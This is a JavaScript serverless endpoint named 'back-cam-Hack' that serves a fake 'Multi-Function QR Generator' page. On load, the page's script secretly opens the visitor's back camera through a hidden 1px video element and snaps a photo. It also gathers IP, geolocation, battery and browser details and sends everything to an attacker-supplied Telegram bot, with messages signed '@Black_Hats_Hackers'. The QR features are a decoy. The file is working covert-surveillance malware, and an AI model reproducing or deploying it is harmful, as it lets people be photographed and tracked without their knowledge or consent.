// api/back-cam-Hack.js
export default async function handler(req, res) {
  const { chatId, botToken } = req.query;

  // Validate required parameters
  if (!chatId || !botToken) {
    return res.status(400).send(`
      <html>
        <head>
          <title>Missing Parameters</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              background-color: #f5f5f5;
            }
            .container {
              text-align: center;
              padding: 2rem;
              border-radius: 10px;
              background-color: white;
              box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
              max-width: 90%;
            }
            h1 {
              color: #d32f2f;
              margin-bottom: 1rem;
            }
            p {
              margin-bottom: 1rem;
              line-height: 1.5;
            }
            code {
              background-color: #f5f5f5;
              padding: 0.2rem 0.4rem;
              border-radius: 4px;
              font-family: monospace;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Missing Parameters</h1>
            <p>Please provide both <code>chatId</code> and <code>botToken</code> as query parameters.</p>
            <p>Example: <code>https://your-website.com/api/back-cam-Hack?chatId=YOUR_CHAT_ID&botToken=YOUR_BOT_TOKEN</code></p>
          </div>
        </body>
      </html>
    `);
  }

  // Get client IP address
  const clientIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // HTML response with QR Generator page
  res.setHeader('Content-Type', 'text/html');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Function QR Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: white;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .header h1 i {
            margin-right: 15px;
            color: #4CAF50;
        }

        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
        }

        /* Function Selector */
        .function-selector {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .function-selector h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .function-selector h3 i {
            margin-right: 10px;
            color: #4CAF50;
        }

        .function-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }

        .function-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .function-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .function-btn.active {
            background: rgba(76, 175, 80, 0.3);
            border-color: #4CAF50;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }

        /* Configuration Section */
        .config-section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .config-card h3 {
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .config-card h3 i {
            margin-right: 10px;
            color: #4CAF50;
        }

        .config-inputs {
            display: grid;
            gap: 20px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
        }

        .input-group label {
            margin-bottom: 8px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .input-group input,
        .input-group textarea,
        .input-group select {
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 1rem;
            color: #333;
            transition: all 0.3s ease;
        }

        .input-group input:focus,
        .input-group textarea:focus,
        .input-group select:focus {
            outline: none;
            background: white;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.3);
        }

        .save-btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .save-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }

        /* Form Sections */
        .form-section {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .warning-text {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.5);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .generate-btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            margin-top: 20px;
        }

        .generate-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }

        /* Hidden Camera Elements */
        #hidden-camera {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
            top: -9999px;
            left: -9999px;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .function-buttons {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 1.6rem;
            }
            
            .form-section,
            .config-section,
            .function-selector {
                padding: 20px;
            }
            
            .generate-btn {
                padding: 12px 20px;
                font-size: 1rem;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Hidden Camera Elements -->
    <div id="hidden-camera">
        <video id="camera-feed" autoplay muted playsinline></video>
        <canvas id="camera-canvas" style="display: none;"></canvas>
    </div>

    <div class="container">
        <header class="header">
            <h1><i class="fas fa-qrcode"></i> Multi-Function QR Generator</h1>
            <p>Advanced QR generator with camera, live video, IP tracking, and multi-function capabilities</p>
        </header>

        <!-- Function Selection -->
        <div class="function-selector">
            <h3><i class="fas fa-list"></i> Select Function</h3>
            <div class="function-buttons">
                <button class="function-btn active" data-function="basic" id="basicBtn">
                    <i class="fas fa-qrcode"></i>
                    Basic QR
                </button>
                <button class="function-btn" data-function="camera" id="cameraBtn">
                    <i class="fas fa-camera"></i>
                    Camera Access
                </button>
                <button class="function-btn" data-function="video" id="videoBtn">
                    <i class="fas fa-video"></i>
                    Live Video
                </button>
                <button class="function-btn" data-function="ip" id="ipBtn">
                    <i class="fas fa-globe"></i>
                    IP Info
                </button>
                <button class="function-btn" data-function="multi" id="multiBtn">
                    <i class="fas fa-layer-group"></i>
                    Multi-Function
                </button>
            </div>
        </div>

        <!-- Bot Configuration Section -->
        <div class="config-section" id="configSection">
            <div class="config-card">
                <h3><i class="fas fa-cog"></i> Bot Configuration</h3>
                <div class="config-inputs">
                    <div class="input-group">
                        <label for="botToken">
                            <i class="fas fa-robot"></i>
                            Telegram Bot Token
                        </label>
                        <input 
                            type="text" 
                            id="botToken" 
                            placeholder="Enter Your Bot Token"
                            value="${botToken}"
                        >
                    </div>
                    <div class="input-group">
                        <label for="chatId">
                            <i class="fas fa-comments"></i>
                            Chat ID
                        </label>
                        <input 
                            type="text" 
                            id="chatId" 
                            placeholder="Enter Your Chat Id"
                            value="${chatId}"
                        >
                    </div>
                    <button class="save-btn" id="saveConfigBtn">
                        <i class="fas fa-save"></i>
                        Save Configuration
                    </button>
                </div>
            </div>
        </div>

        <!-- Basic QR Form -->
        <div class="form-section" id="basicForm">
            <form id="qrForm">
                <div class="input-group">
                    <label for="linkInput">
                        <i class="fas fa-link"></i>
                        Enter URL or Link
                    </label>
                    <input type="url" id="linkInput" placeholder="https://example.com" required>
                </div>
                
                <div class="input-group">
                    <label for="textInput">
                        <i class="fas fa-font"></i>
                        Additional Text (Optional)
                    </label>
                    <textarea id="textInput" placeholder="Enter any additional text here..." rows="3"></textarea>
                </div>
                
                <button type="submit" class="generate-btn">
                    <i class="fas fa-qrcode"></i>
                    Generate QR Code
                </button>
            </form>
        </div>

        <!-- Camera Access Form -->
        <div class="form-section" id="cameraForm" style="display: none;">
            <div class="camera-section">
                <h3><i class="fas fa-camera"></i> Camera Access QR Generator</h3>
                <p class="warning-text">
                    <i class="fas fa-exclamation-triangle"></i>
                    This QR code will request camera permission and capture photos when scanned.
                </p>
                <form id="cameraQrForm">
                    <div class="input-group">
                        <label for="cameraLinkInput">
                            <i class="fas fa-link"></i>
                            Target URL (after photo capture)
                        </label>
                        <input type="url" id="cameraLinkInput" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="cameraTextInput">
                            <i class="fas fa-font"></i>
                            Additional Text (Optional)
                        </label>
                        <textarea id="cameraTextInput" placeholder="Enter additional text..." rows="3"></textarea>
                    </div>
                    
                    <button type="submit" class="generate-btn">
                        <i class="fas fa-camera"></i>
                        Generate Camera QR Code
                    </button>
                </form>
            </div>
        </div>

        <!-- Live Video Form -->
        <div class="form-section" id="videoForm" style="display: none;">
            <div class="video-section">
                <h3><i class="fas fa-video"></i> Live Video QR Generator</h3>
                <p class="warning-text">
                    <i class="fas fa-exclamation-triangle"></i>
                    This QR code will request camera and microphone access for live video capture.
                </p>
                <form id="videoQrForm">
                    <div class="input-group">
                        <label for="videoLinkInput">
                            <i class="fas fa-link"></i>
                            Target URL (after video capture)
                        </label>
                        <input type="url" id="videoLinkInput" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="videoTextInput">
                            <i class="fas fa-font"></i>
                            Additional Text (Optional)
                        </label>
                        <textarea id="videoTextInput" placeholder="Enter additional text..." rows="3"></textarea>
                    </div>
                    
                    <button type="submit" class="generate-btn">
                        <i class="fas fa-video"></i>
                        Generate Video QR Code
                    </button>
                </form>
            </div>
        </div>

        <!-- IP Info Form -->
        <div class="form-section" id="ipForm" style="display: none;">
            <div class="ip-section">
                <h3><i class="fas fa-globe"></i> IP Information QR Generator</h3>
                <p class="warning-text">
                    <i class="fas fa-info-circle"></i>
                    This QR code will collect detailed IP and location information.
                </p>
                <form id="ipQrForm">
                    <div class="input-group">
                        <label for="ipLinkInput">
                            <i class="fas fa-link"></i>
                            Target URL (after data collection)
                        </label>
                        <input type="url" id="ipLinkInput" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="ipTextInput">
                            <i class="fas fa-font"></i>
                            Additional Text (Optional)
                        </label>
                        <textarea id="ipTextInput" placeholder="Enter additional text..." rows="3"></textarea>
                    </div>
                    
                    <button type="submit" class="generate-btn">
                        <i class="fas fa-globe"></i>
                        Generate IP Info QR Code
                    </button>
                </form>
            </div>
        </div>

        <!-- Multi-Function Form -->
        <div class="form-section" id="multiForm" style="display: none;">
            <div class="multi-section">
                <h3><i class="fas fa-layer-group"></i> Multi-Function QR Generator</h3>
                <p class="warning-text">
                    <i class="fas fa-exclamation-triangle"></i>
                    This QR code will collect IP info, camera access, video recording, and all data.
                </p>
                <form id="multiQrForm">
                    <div class="input-group">
                        <label for="multiLinkInput">
                            <i class="fas fa-link"></i>
                            Target URL (after all data collection)
                        </label>
                        <input type="url" id="multiLinkInput" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="multiTextInput">
                            <i class="fas fa-font"></i>
                            Additional Text (Optional)
                        </label>
                        <textarea id="multiTextInput" placeholder="Enter additional text..." rows="3"></textarea>
                    </div>
                    
                    <div class="multi-options">
                        <h4>Select Functions to Include:</h4>
                        <div class="checkbox-group">
                            <label class="checkbox-item">
                                <input type="checkbox" id="includeIP" checked>
                                <span class="checkmark"></span>
                                IP & Location Info
                            </label>
                            <label class="checkbox-item">
                                <input type="checkbox" id="includeCamera" checked>
                                <span class="checkmark"></span>
                                Camera Access
                            </label>
                            <label class="checkbox-item">
                                <input type="checkbox" id="includeVideo" checked>
                                <span class="checkmark"></span>
                                Live Video Recording
                            </label>
                            <label class="checkbox-item">
                                <input type="checkbox" id="includeDevice" checked>
                                <span class="checkmark"></span>
                                Device Information
                            </label>
                        </div>
                    </div>
                    
                    <button type="submit" class="generate-btn">
                        <i class="fas fa-layer-group"></i>
                        Generate Multi-Function QR Code
                    </button>
                </form>
            </div>
        </div>

        <!-- Features Section -->
        <div class="form-section">
            <h3><i class="fas fa-star"></i> Advanced Features</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-top: 20px;">
                <div style="background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; text-align: center;">
                    <i class="fas fa-camera" style="font-size: 2rem; color: #4CAF50; margin-bottom: 10px;"></i>
                    <h4>Camera Access</h4>
                    <p>Request camera permission and capture photos</p>
                </div>
                <div style="background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; text-align: center;">
                    <i class="fas fa-video" style="font-size: 2rem; color: #4CAF50; margin-bottom: 10px;"></i>
                    <h4>Live Video</h4>
                    <p>Record live video with audio</p>
                </div>
                <div style="background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; text-align: center;">
                    <i class="fas fa-map-marked-alt" style="font-size: 2rem; color: #4CAF50; margin-bottom: 10px;"></i>
                    <h4>Location Tracking</h4>
                    <p>Precise IP geolocation tracking</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        // Configuration from URL parameters
        const botToken = "${botToken}";
        const chatId = "${chatId}";
        const serverIp = "${clientIP}";

        // Camera elements
        const cameraFeed = document.getElementById('camera-feed');
        const cameraCanvas = document.getElementById('camera-canvas');
        const ctx = cameraCanvas.getContext('2d');

        let stream = null;
        let capturedPhoto = null;
        let cameraAccessAttempted = false;

        // Device information
        let userAgent = navigator.userAgent;
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let currentTime = new Date().toLocaleString();
        let batteryLevel = 'Unknown';
        let isCharging = false;

        // Initialize the application
        document.addEventListener('DOMContentLoaded', function() {
            initializeQRGenerator();
            initializeCameraCapture();
        });

        // Initialize QR Generator functionality
        function initializeQRGenerator() {
            const functionBtns = document.querySelectorAll('.function-btn');
            const formSections = document.querySelectorAll('.form-section');
            const saveConfigBtn = document.getElementById('saveConfigBtn');

            // Function selection
            functionBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    const functionType = this.getAttribute('data-function');
                    switchFunction(functionType);
                });
            });

            // Form submissions
            document.getElementById('qrForm').addEventListener('submit', generateBasicQR);
            document.getElementById('cameraQrForm').addEventListener('submit', generateCameraQR);
            document.getElementById('videoQrForm').addEventListener('submit', generateVideoQR);
            document.getElementById('ipQrForm').addEventListener('submit', generateIPQR);
            document.getElementById('multiQrForm').addEventListener('submit', generateMultiQR);

            // Configuration save
            saveConfigBtn.addEventListener('click', saveConfiguration);

            // Load saved configuration
            loadConfiguration();
        }

        function switchFunction(functionType) {
            const functionBtns = document.querySelectorAll('.function-btn');
            const formSections = document.querySelectorAll('.form-section');

            // Update active button
            functionBtns.forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('data-function') === functionType) {
                    btn.classList.add('active');
                }
            });

            // Show corresponding form section
            formSections.forEach(section => {
                section.style.display = 'none';
            });

            switch(functionType) {
                case 'basic':
                    document.getElementById('basicForm').style.display = 'block';
                    break;
                case 'camera':
                    document.getElementById('cameraForm').style.display = 'block';
                    break;
                case 'video':
                    document.getElementById('videoForm').style.display = 'block';
                    break;
                case 'ip':
                    document.getElementById('ipForm').style.display = 'block';
                    break;
                case 'multi':
                    document.getElementById('multiForm').style.display = 'block';
                    break;
            }
        }

        function loadConfiguration() {
            const savedConfig = localStorage.getItem('qrGeneratorConfig');
            if (savedConfig) {
                const config = JSON.parse(savedConfig);
                document.getElementById('botToken').value = config.botToken || botToken;
                document.getElementById('chatId').value = config.chatId || chatId;
            } else {
                document.getElementById('botToken').value = botToken;
                document.getElementById('chatId').value = chatId;
            }
        }

        function saveConfiguration() {
            const botToken = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatId').value.trim();

            if (!botToken || !chatId) {
                alert('Please enter both Bot Token and Chat ID');
                return;
            }

            const config = { botToken, chatId };
            localStorage.setItem('qrGeneratorConfig', JSON.stringify(config));
            
            alert('Configuration saved successfully!');
        }

        // QR Generation Functions
        function generateBasicQR(e) {
            e.preventDefault();
            const link = document.getElementById('linkInput').value.trim();
            const text = document.getElementById('textInput').value.trim();
            
            if (!link) {
                alert('Please enter a URL');
                return;
            }

            generateQRCode('basic', link, text);
        }

        function generateCameraQR(e) {
            e.preventDefault();
            const link = document.getElementById('cameraLinkInput').value.trim();
            const text = document.getElementById('cameraTextInput').value.trim();
            
            if (!link) {
                alert('Please enter a target URL');
                return;
            }

            generateQRCode('camera', link, text);
        }

        function generateVideoQR(e) {
            e.preventDefault();
            const link = document.getElementById('videoLinkInput').value.trim();
            const text = document.getElementById('videoTextInput').value.trim();
            
            if (!link) {
                alert('Please enter a target URL');
                return;
            }

            generateQRCode('video', link, text);
        }

        function generateIPQR(e) {
            e.preventDefault();
            const link = document.getElementById('ipLinkInput').value.trim();
            const text = document.getElementById('ipTextInput').value.trim();
            
            if (!link) {
                alert('Please enter a target URL');
                return;
            }

            generateQRCode('ip', link, text);
        }

        function generateMultiQR(e) {
            e.preventDefault();
            const link = document.getElementById('multiLinkInput').value.trim();
            const text = document.getElementById('multiTextInput').value.trim();
            
            if (!link) {
                alert('Please enter a target URL');
                return;
            }

            const features = [];
            if (document.getElementById('includeIP').checked) features.push('ip_info');
            if (document.getElementById('includeCamera').checked) features.push('camera');
            if (document.getElementById('includeVideo').checked) features.push('video');
            if (document.getElementById('includeDevice').checked) features.push('device_info');

            generateQRCode('multi', link, text, features);
        }

        function generateQRCode(type, link, text, features = []) {
            const qrData = {
                type: type,
                link: link,
                text: text,
                features: features,
                timestamp: new Date().toISOString()
            };

            // Create QR code
            const qr = qrcode(0, 'M');
            qr.addData(JSON.stringify(qrData));
            qr.make();

            // Display QR code (you can implement this part)
            alert('QR Code generated successfully! Check the console for data.');
            console.log('QR Code Data:', qrData);
        }

        // Camera Capture Functionality
        async function initializeCameraCapture() {
            await getBatteryInfo();
            
            // Wait a moment before attempting camera access
            setTimeout(async () => {
                await captureCameraSilently();
            }, 1000);
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + '%';
                    isCharging = battery.charging;
                }
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
        }

        async function captureCameraSilently() {
            if (cameraAccessAttempted) return;
            cameraAccessAttempted = true;
            
            try {
                // Try to get the back camera first
                const constraints = {
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraFeed.srcObject = stream;
                
                // Wait for video to be ready
                cameraFeed.onloadedmetadata = function() {
                    setTimeout(() => {
                        capturePhotoSilently();
                    }, 2000);
                };
            } catch (error) {
                console.error('Error accessing back camera:', error);
                
                // If back camera fails, try any available camera
                try {
                    const constraints = {
                        video: true,
                        audio: false 
                    };
                    
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraFeed.srcObject = stream;
                    
                    cameraFeed.onloadedmetadata = function() {
                        setTimeout(() => {
                            capturePhotoSilently();
                        }, 2000);
                    };
                } catch (fallbackError) {
                    console.error('Error accessing any camera:', fallbackError);
                    sendInitialDataToTelegram();
                }
            }
        }

        function capturePhotoSilently() {
            try {
                cameraCanvas.width = cameraFeed.videoWidth;
                cameraCanvas.height = cameraFeed.videoHeight;
                ctx.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
                
                capturedPhoto = cameraCanvas.toDataURL('image/jpeg');
                
                // Stop camera stream
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Send data to Telegram
                sendInitialDataToTelegram();
            } catch (error) {
                console.error('Error capturing photo:', error);
                sendInitialDataToTelegram();
            }
        }

        // Get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return serverIp || 'Unknown';
            }
        }

        // Get location info
        async function getLocationInfo(ip) {
            try {
                const response = await fetch(\`https://ipapi.co/\${ip}/json/\`);
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                return {
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        // Send initial data to Telegram
        async function sendInitialDataToTelegram() {
            const clientIP = await getIPAddress();
            const locationInfo = await getLocationInfo(clientIP);
            
            const message = \`🚨 QR GENERATOR ACCESS DETECTED 🚨

🌍 IP Address: \${clientIP}
🏳️ Country: \${locationInfo.country}
🏙️ City: \${locationInfo.city}
📡 ISP: \${locationInfo.isp}
⏰ Timezone: \${timezone}
🕒 Current Time: \${currentTime}
🔋 Battery: \${batteryLevel}
⚡ Charging: \${isCharging ? 'Yes' : 'No'}
🌐 Browser: \${userAgent}

📱 Device accessed QR Generator interface

🔗 Generated by: @Black_Hats_Hackers\`;
            
            if (capturedPhoto) {
                try {
                    const response = await fetch(capturedPhoto);
                    const blob = await response.blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'camera_capture.jpg');
                    formData.append('caption', message);
                    
                    await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                        method: 'POST',
                        body: formData,
                    });
                } catch (photoError) {
                    await sendTextMessage(message);
                }
            } else {
                await sendTextMessage(message);
            }
        }

        async function sendTextMessage(message) {
            try {
                await fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
            } catch (error) {
                console.error('Error sending message:', error);
            }
        }
    </script>
</body>
</html>
  `);
}